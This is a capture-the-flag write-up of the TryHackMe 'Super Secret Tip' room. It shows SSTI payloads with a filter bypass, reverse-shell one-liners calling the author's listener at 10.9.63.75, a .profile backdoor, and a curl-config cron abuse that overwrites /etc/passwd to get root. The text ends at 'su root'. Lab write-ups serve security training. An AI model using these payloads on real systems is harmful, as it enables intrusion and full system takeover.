---
layout: post
title: TryHackMe - Super Secret Tip
date: 2023-12-27 17:05:00 +0700
tags: [security, web, python, encryption, privesc, SSTI, cronjobs]
toc: true
---

<p class="message">Are you only good at one thing? You better be a matrix!</p>

| Title      | Super Secret Tip                  |
| ---------- | --------------------------------- |
| Difficulty | Medium                            |
| Authors    | tryhackme & ayhamalali            |
| Tags       | security, web, python, encryption |

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn supersecrettip.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-20 15:48 +07
Nmap scan report for supersecrettip.thm (10.10.143.107)
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt

Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -A -sV -Pn -p 22,7777 supersecrettip.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-20 15:48 +07
Nmap scan report for supersecrettip.thm (10.10.143.107)
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3eb818ef45a8df59bf11494b1db6b893 (RSA)
|   256 0bcff994068597f6bdcc33664e26ea27 (ECDSA)
|_  256 60cebe2d1ef018003070ffa266d785f7 (ED25519)
7777/tcp open  cbt?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.3.4 Python/3.11.0
|     Date: Wed, 20 Dec 2023 08:48:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5688
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="description" content="SSTI is wonderful">
|     <meta name="author" content="[REDACTED] Al-Ali">
|     <link rel="icon" href="favicon.ico">
|     <title>Super Secret TIp</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom styles for this template -->
|     <link href="/static/css/carousel.css" rel="stylesheet">
|     </head>
|     <!-- NAVBAR
|     ================================================== -->
|     <body>
|     <div class="navbar-wrapper">
|     <div class=
|   Socks5:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7777-TCP:V=7.93%I=7%D=12/20%Time=6582AA72%P=x86_64-pc-linux-gnu%r(S
SF:ocks5,18B,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<
SF:head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20
SF:\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad
SF:\x20request\x20syntax\x20\('\\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x
SF:00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20e
SF:xplanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupporte
SF:d\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(GetRequest,14
SF:9F,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.3\.4\x20Python/3\.
SF:11\.0\r\nDate:\x20Wed,\x2020\x20Dec\x202023\x2008:48:55\x20GMT\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x205688\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\
SF:x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x2
SF:0\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\">\n\n\x20\x20\x20\x20<meta\x20name=\"descriptio
SF:n\"\x20content=\"SSTI\x20is\x20wonderful\">\n\x20\x20\x20\x20<meta\x20n
SF:ame=\"author\"\x20content=\"[REDACTED]\x20Al-Ali\">\n\x20\x20\x20\x20<link\x
SF:20rel=\"icon\"\x20href=\"favicon\.ico\">\n\n\x20\x20\x20\x20<title>Supe
SF:r\x20Secret\x20TIp</title>\n\n\x20\x20\x20\x20<!--\x20Bootstrap\x20core
SF:\x20CSS\x20-->\n\x20\x20\x20\x20<link\x20href=\"/static/css/bootstrap\.
SF:min\.css\"\x20rel=\"stylesheet\">\n\n\x20\x20\x20\x20<!--\x20Custom\x20
SF:styles\x20for\x20this\x20template\x20-->\n\x20\x20\x20\x20<link\x20href
SF:=\"/static/css/carousel\.css\"\x20rel=\"stylesheet\">\n\x20\x20</head>\
SF:n<!--\x20NAVBAR\n==================================================\x20
SF:-->\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20class=\"navbar-wrapper\">\
SF:n\x20\x20\x20\x20\x20\x20<div\x20class=");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   269.35 ms 10.9.0.1
2   269.47 ms supersecrettip.thm (10.10.143.107)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.66 seconds
```

### Fuzzing

I use **feroxbuster** to fuzz the sub-directories of the target server on port `7777` and discover 2 available paths:

```
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://supersecrettip.thm:7777/
 🚀  Threads               │ 50
 📖  Wordlist              │ directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💢  Size Filter           │ 0
 💢  Line Count Filter     │ 1
 🔎  Extract Links         │ true
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      174l      383w     3133c http://supersecrettip.thm:7777/static/css/carousel.css
200      GET        7l      414w    35951c http://supersecrettip.thm:7777/static/js/bootstrap.min.js
200      GET      139l      815w    74054c http://supersecrettip.thm:7777/static/imgs/person.jpg
200      GET        5l     1428w   117305c http://supersecrettip.thm:7777/static/css/bootstrap.min.css
200      GET      141l      430w     5688c http://supersecrettip.thm:7777/
200      GET       69l      159w     1957c http://supersecrettip.thm:7777/debug
200      GET       80l      235w     2991c http://supersecrettip.thm:7777/cloud
```

View them on web browser:

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled.png)

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%201.png)

On the `/cloud`, I try to select a random option and click on **Download** button to download the selected file but it displayed the error:

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%202.png)

Using **BurpSuite** to capture the download request, I figure out the payload might be incorrect format with redundant part `&download=`:

```
POST /cloud HTTP/1.1
Host: supersecrettip.thm:7777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://supersecrettip.thm:7777
Connection: close
Referer: http://supersecrettip.thm:7777/cloud
Upgrade-Insecure-Requests: 1

download=my-passwords.txt&download=
```

I modify it to the correct one (I thought) and try to re-send the request but it did not work too:

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%203.png)

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ curl -X POST http://supersecrettip.thm:7777/cloud --data 'download=my-passwords.txt'
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

After testing for a while, I unintentionally figure out this file is able to be downloaded:

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%204.png)

So I using `curl` to verify it once again:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=templates.py"
from flask import *
import hashlib
import os
```

After analyzing the **request** and **response** via **BurpSuite**, it's evident that the problem isn't associated with the payload structure `download=<file-name>&download=`. Rather, it seems to be dependent on the accuracy of the filename.

So I’m gonna fuzz the filename with this payload request. However, I don’t know why the **fuff** tool and other similar did not work. Then I write my own simple script:

```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://supersecrettip.thm:7777/cloud"
wordlist_file = "/home/kali/Wordlists/directory-list-2.3-medium.txt"
num_threads = 10 # Number of threads for concurrent requests
print("Fuzzing...")

def send_request(file_name):
    data = {"download": file_name + ".py"}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(f"[+]File name \"\033[1m{file_name}\"\033[0m is correct!")

    with open(wordlist_file) as f:
        file_names = f.readlines()
        file_names = [name.strip() for name in file_names]

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(send_request, file_names)
```

And this is the result:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ python3 fuzzing.py
Fuzzing...
[+]File name "templates" is correct!
[+]File name "source" is correct!
```

And the source code I downloaded:

source.py

```python
from flask import \*
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(**name**)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"])
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True) # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"])
def debug():
debug = request.args.get('debug')
user_password = request.args.get('password')

    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")


    session['debug'] = debug
    session['password'] = encrypted_pass

    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"])
def debugResult():
if not ip.checkIP(request):
return abort(401, "Everything made in home, we don't like intruders.")

    if not session:
        return render_template("debugresult.html")

    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')

    if not debug and not user_password:
        return render_template("debugresult.html")

    # return render_template("debugresult.html", debug=debug, success=True)

    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if **name** == "**main**":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

Read a few first lines from the script, I notice that there is a file placed in the same directory with this source code which is ‘supersecrettip.txt’. So I decided to download it using `curl`:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=supersecrettip.txt"
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

Unfortunately, I cannot decode this output and do not know what it actually does. Therefore, I move on to the `import` part and figure out the ‘debugpassword’ library might be placed in the same directory with this source code based on the comment line right after it ‘`from .`’. But the script only allows to download file with extension `.py` and `.txt` so I apply the **NULL BYTES** technique to bypass this restriction:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=debugpassword.py%00.txt"
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'[REDACTED]')
```

<p class="message">
💡 The ‘debugpassword.py%00.txt’ will become ‘debugpassword.py’ because the ‘.txt’ is ignored after the NULL BYTE `%00`

</p>

Wow, the password (`passwd`) was encrypted with **XOR** algorithm and the key is `b'[REDACTED]'`. I write a simple script based on the encryption function:

```python
import pwn

cipher = b" \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e"
key = b'[REDACTED]'

def get_decrypted(cipher):
    return (pwn.xor(cipher, key)).decode('utf-8')

decoded_string = get_decrypted(cipher)

print(decoded_string)
```

And this is the result

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ python3 decode.py
[REDACTED]Deebugg
```

Enter the result into the **password** field:

```
http://supersecrettip.thm:7777/debug?debug=%7B%7B7*7%7D%7D&password=[REDACTED]Deebugg
```

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%205.png)

OK, now the result is stored in the `/debugresult` path. However, the access was restricted by the IP address:

```python
if not ip.checkIP(request):
    return abort(401, "Everything made in home, we don't like intruders.")
```

From here, I need to get the content of the `ip` function where it was imported from the same local directory:

```python
import ip # from .
```

Use the same previous method and I get the logic:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=ip.py%00.txt"
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

It checked for the `X-Forwarded-For` if it exists in the header of the request or not. If not, it would take the remote address attribute to compare with the `host_ip` variable which is “**127.0.0.1**”.

So I easily bypass this authentication by inserting the `X-Forwarded-For` attribute in my request within BurpSuite:

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%206.png)

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%207.png)

From the above result, it is easily to recognize that the first input field from the `/debug` is injectable with **SSTI** (Server-side template Injection).

## Exploit

I will test a simple **SSTI Payload**:

```python
{{ config.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%208.png)

So it worked! Now, it’s time to delivery the **RCE** payload.

The original is:

```
{{ config.__init__.__globals__.__builtins__.__import__("os").popen("bash -c \"bash -i >& /dev/tcp/10.9.63.75/4444 0>&1\"") }}
```

But there is the restriction method and it does not allow the ampersand character `&`. Therefore, I have to modify the script to bypass the retrisction:

```
{{ config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.9.63.75/4444 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```

![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%209.png)

Start a listener on local and send the request to `/debugresult`:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.17.241] 54388
bash: cannot set terminal process group (14): Inappropriate ioctl for device
bash: no job control in this shell
[REDACTED]@482cbf2305ae:/app$ whoami;id;pwd;ls -la
whoami;id;pwd;ls -la
[REDACTED]
uid=1000([REDACTED]) gid=1000([REDACTED]) groups=1000([REDACTED])
/app
total 40
drwxr-xr-x 1 root root 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
drwxr-xr-x 2 root root 4096 May 20  2023 __pycache__
drwxr-xr-x 2 root root 4096 May 17  2023 cloud
-rw-r--r-- 1 root root   92 Jun 24  2023 debugpassword.py
-rw-r--r-- 1 root root  170 May 20  2023 ip.py
-rw-r--r-- 1 root root 2898 Jun 24  2023 source.py
drwxr-xr-x 6 root root 4096 Apr  2  2023 static
-rw-r--r-- 1 root root   44 May 17  2023 supersecrettip.txt
drwxr-xr-x 2 root root 4096 Apr  2  2023 templates
```

Navigate to the current user’s directory and get the first flag:

```
[REDACTED]@482cbf2305ae:/app$ cd
cd
[REDACTED]@482cbf2305ae:~$ ls -l
ls -l
total 4
-rw-r--r-- 1 root root 32 Apr  2  2023 flag1.txt
[REDACTED]@482cbf2305ae:~$ cat flag1.txt
THM{[REDACTED]}
```

### Horizontal Privilege Escalation

```
[REDACTED]@482cbf2305ae:~$ cd ..
cd ..
[REDACTED]@482cbf2305ae:/home$ ls -l
ls -l
total 8
drwxr-xr-x 1 F30s  F30s  4096 Jun 24  2023 F30s
drwxr-xr-x 1 [REDACTED] [REDACTED] 4096 Jun 24  2023 [REDACTED]
[REDACTED]@482cbf2305ae:/home$ cd F30s
cd F30s
[REDACTED]@482cbf2305ae:/home/F30s$ ls -la
ls -la
total 32
drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
-rw-r--r-- 1 F30s F30s  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 F30s F30s 3526 Mar 27  2022 .bashrc
-rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
-rw-r--r-- 1 root root   17 May 19  2023 health_check
-rw-r----- 1 F30s F30s   38 May 22  2023 site_check
[REDACTED]@482cbf2305ae:/home/F30s$ file *
file *
health_check: ASCII text
site_check:   regular file, no read permission
```

Navigate to the root `/` directory and I explore a `.txt` file:

```
[REDACTED]@482cbf2305ae:/home/F30s$ cd /
cd /
[REDACTED]@482cbf2305ae:/$ ls -la
ls -la
total 88
drwxr-xr-x   1 root root 4096 Jun 24  2023 .
drwxr-xr-x   1 root root 4096 Jun 24  2023 ..
-rwxr-xr-x   1 root root    0 Jun 24  2023 .dockerenv
drwxr-xr-x   1 root root 4096 Jun 24  2023 app
drwxr-xr-x   1 root root 4096 Jun  6  2023 bin
drwxr-xr-x   2 root root 4096 Sep  3  2022 boot
drwxr-xr-x   5 root root  340 Dec 26 06:55 dev
drwxr-xr-x   1 root root 4096 Jun 24  2023 etc
drwxr-xr-x   1 root root 4096 Jun 24  2023 home
drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
drwxr-xr-x   2 root root 4096 Nov 14  2022 lib64
drwxr-xr-x   2 root root 4096 Nov 14  2022 media
drwxr-xr-x   2 root root 4096 Nov 14  2022 mnt
drwxr-xr-x   2 root root 4096 Nov 14  2022 opt
dr-xr-xr-x 115 root root    0 Dec 26 06:55 proc
drwx------   1 root root 4096 Jun 24  2023 root
drwxr-xr-x   1 root root 4096 Jun 24  2023 run
drwxr-xr-x   1 root root 4096 Nov 15  2022 sbin
-rw-r--r--   1 root root  629 May 19  2023 secret-tip.txt
drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Dec 26 06:55 sys
drwxrwxrwt   1 root root 4096 Dec 26 09:08 tmp
drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
drwxr-xr-x   1 root root 4096 Nov 14  2022 var
```

It’s content:

```
A wise *gpt* once said ...
In the depths of a hidden vault, the mastermind discovered that vital ▒▒▒▒▒ of their secret ▒▒▒▒▒▒ had vanished without a trace. They knew their ▒▒▒▒▒▒▒ was now vulnerable to disruption, setting in motion a desperate race against time to recover the missing ▒▒▒▒▒▒ before their ▒▒▒▒▒▒▒ unraveled before their eyes.
So, I was missing 2 .. hmm .. what were they called? ... I actually forgot, anyways I need to remember them, they're important. The past/back/before/not after actually matters, follow it!
Don't forget it's always about root!
```

Ok, the note is trying to say that there are 2 missing of something and some other stuffs. However, I do not understand them currently, so I decide to move on using some common ways to escalate to other privileges.

Finding **SUID** files set permission, I explore the `exim4` is interesting:

```
[REDACTED]@482cbf2305ae:/$ find / -type f -perm -04000 2>/dev/null
find / -type f -perm -04000 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
[REDACTED]@482cbf2305ae:/$ ls -l /usr/sbin/exim4
ls -l /usr/sbin/exim4
-rwsr-xr-x 1 root root 1360680 Jul 13  2021 /usr/sbin/exim4
```

Unfortunately, checking it version make me realize that it is not too old to be exploit:

```
[REDACTED]@482cbf2305ae:/tmp$ /usr/sbin/exim4 --version
/usr/sbin/exim4 --version
Exim version 4.94.2 #2 built 13-Jul-2021 16:04:57
Copyright (c) University of Cambridge, 1995 - 2018
[--snip--]
```

Then I move on to the cronjobs and this is what the vulnerabilities occur:

```
[REDACTED]@482cbf2305ae:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

The crontab of user `F30s` would run a Bash command every minute, which reads and outputs the contents of the file `/home/F30s/health_check`

The `health_check` is just a simple TXT file and does not contain any sensitive information

```
[REDACTED]@482cbf2305ae:/$ cat /home/F30s/health_check
cat /home/F30s/health_check
Health: 1337/100
```

But here is the point: `-l`. The `-l` option stands for the “login shell” which mean when the Bash is invoked by the login shell (where I am), it reads the initialization file as `~/.profile` of the owner user. So I can modify the `PATH` variable to make the script execute my own `cat` with RCE script:

Verify that the `.profile` inside `F30s` user’s environment is able to be modified:

```
[REDACTED]@482cbf2305ae:/home/F30s$ ls -la
ls -la
total 32
drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
-rw-r--r-- 1 F30s F30s  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 F30s F30s 3526 Mar 27  2022 .bashrc
-rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
-rw-r--r-- 1 root root   17 May 19  2023 health_check
-rw-r----- 1 F30s F30s   38 May 22  2023 site_check
```

```
[REDACTED]@482cbf2305ae:/home/F30s$ echo "bash -i >& /dev/tcp/10.9.63.75/4443 0>&1" >> /home/F30s/.profile
<ev/tcp/10.9.63.75/4443 0>&1" >> /home/F30s/.profile
[REDACTED]@482cbf2305ae:/home/F30s$ tail .profile
tail .profile
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
PATH="/tmp/:$PATH"
bash -i >& /dev/tcp/10.9.63.75/4443 0>&1
```

Start another listener and wait for a minute:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.17.241] 39630
bash: cannot set terminal process group (3563): Inappropriate ioctl for device
bash: no job control in this shell
F30s@482cbf2305ae:~$ id
id
uid=1001(F30s) gid=1001(F30s) groups=1001(F30s)
```

### Vertical Privilege Escalation

Look back to the crontab at this line:

```
*  *    * * *   root    curl -K /home/F30s/site_check
```

The `curl -K` option is used to specify a configuration file for `curl` to read command-line options and URLs from. This means the `site_check` is currently used as a configuration file which is executed by the `curl` command. Generally, if the content of `site_check` is:

```
url = http://example.com
```

And when the `curl -K /home/F30s/site_check` execute, it would equal to this command line:

```
curl -u "http://example.com"
```

So if I modify the `site_check` file to this:

```
url = "http://10.9.63.75:8000/passwd"
-o /etc/passwd
```

within “`10.9.63.75`" is my local IP Address, it would be like this:

```
curl -u "http://10.9.63.75:8000/passwd" -o "/etc/passwd"
```

The system will get the `passwd` file on my local machine and then pass it as `passwd` into `/etc/`, or in other words, it would replace the original `/etc/passwd` with my own one. So I copy the current `/etc/passwd` of the target machine and modify it by replacing the original `root` user configuration as:

```
root:x:0:0:root:/root:/bin/bash
```

to

```
root::0:0:root:/root:/bin/sh
```

Then wait for a minute and re-check the `/etc/passwd` on the target system, the result would be:

Original

```
[REDACTED]@482cbf2305ae:/home/F30s$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Debian-exim:x:101:103::/var/spool/exim4:/usr/sbin/nologin
[REDACTED]:x:1000:1000::/home/[REDACTED]:/bin/bash
F30s:x:1001:1001::/home/F30s:/bin/bash
```

After the `curl -K /home/F30s/site_check` is auto executed by the cronjobs

```
[REDACTED]@482cbf2305ae:/home/F30s$ cat /etc/passwd
cat /etc/passwd
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Debian-exim:x:101:103::/var/spool/exim4:/usr/sbin/nologin
[REDACTED]:x:1000:1000::/home/[REDACTED]:/bin/bash
F30s:x:1001:1001::/home/F30s:/bin/bash
root::0:0:root:/root:/bin/sh
```

Now I simply type `su root` without any password required and become root user:

```
